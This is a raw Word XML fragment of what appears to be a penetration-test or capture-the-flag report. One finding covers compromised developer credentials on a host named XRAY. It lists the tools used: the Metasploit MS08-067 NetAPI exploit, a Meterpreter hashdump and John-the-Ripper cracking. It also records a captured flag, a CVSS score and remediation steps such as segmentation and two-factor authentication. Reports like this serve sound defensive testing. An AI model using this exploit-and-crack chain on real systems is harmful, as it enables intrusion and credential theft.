          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>09</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>omm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Implem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nt DLP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t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ols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ect steg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g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hic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ove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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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in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n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g 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ethi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s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>4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.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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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C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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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mpr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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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m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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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se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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>D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ev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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l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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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p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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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r Cred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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ia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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fl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g 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ent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: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FL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G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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>{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ch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_pa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swo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_cr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ck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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="18"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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isk Rat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ng: Hi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g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| C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VS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e: 7.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="99"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Summa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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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he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curi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y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nt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an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ger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(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SA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)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ile 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w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sed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he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="4"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x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-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y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e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(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172.31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.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1.1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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2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)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Th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e 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swo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or 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er moo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w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cra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ked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ng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J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hn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-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e-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ip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er.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Weak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shing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g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ori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ms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(un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ed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4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)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cili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ss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w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ord r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6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v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er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y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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oo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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/C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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mma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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>U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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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et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sp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oit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et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AP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I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er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v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er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low (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s0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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>8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-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067)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exp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oit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ete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eter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sh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ump</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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J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hn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-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e-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ip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er</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>omm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Implem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nt ne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work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seg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entation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st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v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ile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g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 p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inciples.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Upg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 the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XR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Y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 operating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syst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m to W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w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11.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Upg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e to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wo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-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ctor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uthe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ion.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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orce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g 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swo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policies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1039" w:right="2879"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
